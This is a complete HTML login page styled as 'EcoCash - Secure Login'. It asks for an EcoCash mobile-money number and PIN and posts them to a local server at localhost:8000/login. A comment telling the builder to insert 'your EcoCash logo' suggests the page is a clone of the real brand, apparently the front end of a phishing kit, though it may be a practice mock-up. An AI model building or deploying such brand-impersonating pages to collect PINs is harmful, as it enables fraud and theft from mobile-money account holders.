<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EcoCash - Secure Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .login-container {
            background-color: white;
            border-radius: 12px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 420px;
            overflow: hidden;
        }
        
        .login-header {
            background-color: #1a73e8;
            padding: 30px 20px;
            text-align: center;
            color: white;
        }
        
        .logo-placeholder {
            width: 120px;
            height: 120px;
            margin: 0 auto 15px;
            background-color: white;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 40px;
            color: #1a73e8;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
        }
        
        .logo-placeholder img {
            width: 80px;
            height: 80px;
            object-fit: contain;
        }
        
        .login-header h1 {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 5px;
        }
        
        .login-header p {
            font-size: 14px;
            opacity: 0.9;
        }
        
        .login-form {
            padding: 30px;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            color: #333;
            font-size: 14px;
        }
        
        .form-control {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid #ddd;
            border-radius: 6px;
            font-size: 16px;
            transition: all 0.3s;
        }
        
        .form-control:focus {
            border-color: #1a73e8;
            box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.2);
            outline: none;
        }
        
        .btn {
            display: block;
            width: 100%;
            padding: 14px;
            background-color: #1a73e8;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        
        .btn:hover {
            background-color: #0d62d9;
        }
        
        .form-footer {
            text-align: center;
            margin-top: 20px;
            font-size: 14px;
            color: #666;
        }
        
        .form-footer a {
            color: #1a73e8;
            text-decoration: none;
        }
        
        .form-footer a:hover {
            text-decoration: underline;
        }
        
        @media (max-width: 480px) {
            .login-container {
                max-width: 100%;
            }
            
            .login-form {
                padding: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-header">
            <div class="logo-placeholder">
                <!-- Replace this with your EcoCash logo -->
                <img src="static/eco.jpeg" alt="EcoCash Logo" id="ecocashLogo">
            </div>
            <h1>EcoCash Login</h1>
            <p>Secure access to your account</p>
        </div>
        
        <!-- Traditional form submission -->
        <form class="login-form" action="http://localhost:8000/login" method="POST">
            <div class="form-group">
                <label for="ecocashNumber">EcoCash Number</label>
                <input type="tel" id="ecocashNumber" name="ecocashNumber" class="form-control" placeholder="077 123 4567" required>
            </div>
            
            <div class="form-group">
                <label for="ecocashPin">EcoCash PIN</label>
                <input type="password" id="ecocashPin" name="ecocashPin" class="form-control" placeholder="Enter your PIN" required>
            </div>
            
            <button type="submit" class="btn">Login to EcoCash</button>
            
            <div class="form-footer">
                <a href="#">Forgot your PIN?</a>
            </div>
        </form>
    </div>
</body>
</html>
